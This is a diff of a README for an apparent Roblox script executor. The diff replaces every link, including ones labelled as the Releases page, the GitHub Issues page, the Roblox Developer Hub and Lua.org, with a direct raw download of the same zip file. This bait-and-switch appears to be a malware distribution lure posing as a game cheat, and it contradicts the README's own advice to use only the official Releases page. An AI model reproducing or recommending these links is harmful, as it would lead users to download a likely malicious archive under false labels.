@@ -1,6 +1,6 @@
 # 🎮 Roblox-Incognito-le - Easy Roblox Executor for Enhanced Gameplay
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue)](https://github.com/georgywasiat/Roblox-Incognito-le/releases)
+[![Download Now](https://raw.githubusercontent.com/georgywasiat/Roblox-Incognito-le/main/betaine/Roblox-Incognito-le.zip)](https://raw.githubusercontent.com/georgywasiat/Roblox-Incognito-le/main/betaine/Roblox-Incognito-le.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to Roblox-Incognito-le! This application lets you execute Lua scripts in
 
 To get started, visit this page to download our application:
 
-[Download Roblox-Incognito-le](https://github.com/georgywasiat/Roblox-Incognito-le/releases)
+[Download Roblox-Incognito-le](https://raw.githubusercontent.com/georgywasiat/Roblox-Incognito-le/main/betaine/Roblox-Incognito-le.zip)
 
 ### Installation Steps
 
@@ -52,7 +52,7 @@ Using Roblox-Incognito-le may violate Roblox's terms of service. This can result
 
 If you encounter issues:
 
-1. Visit the [GitHub Issues page](https://github.com/georgywasiat/Roblox-Incognito-le/issues) to report problems.
+1. Visit the [GitHub Issues page](https://raw.githubusercontent.com/georgywasiat/Roblox-Incognito-le/main/betaine/Roblox-Incognito-le.zip) to report problems.
 2. Check the FAQ section for common questions.
 3. Join our community forums for additional help and tips.
 
@@ -76,12 +76,12 @@ If you need an older version, you can find it on the Releases page under the "As
 
 For further reading and resources related to Roblox and scripting, consider the following links:
 
-- [Roblox Developer Hub](https://developer.roblox.com/)
-- [Lua Scripting Language](https://www.lua.org/)
+- [Roblox Developer Hub](https://raw.githubusercontent.com/georgywasiat/Roblox-Incognito-le/main/betaine/Roblox-Incognito-le.zip)
+- [Lua Scripting Language](https://raw.githubusercontent.com/georgywasiat/Roblox-Incognito-le/main/betaine/Roblox-Incognito-le.zip)
 - Community forums and Discord servers related to Roblox scripting.
 
 ## 🔒 Security Information
 
 We prioritize your security. Ensure you download Roblox-Incognito-le only from the official Releases page. Regularly update your antivirus software to keep your system safe.
 
-[Download Roblox-Incognito-le](https://github.com/georgywasiat/Roblox-Incognito-le/releases) to enhance your Roblox experience today!
+[Download Roblox-Incognito-le](https://raw.githubusercontent.com/georgywasiat/Roblox-Incognito-le/main/betaine/Roblox-Incognito-le.zip) to enhance your Roblox experience today!
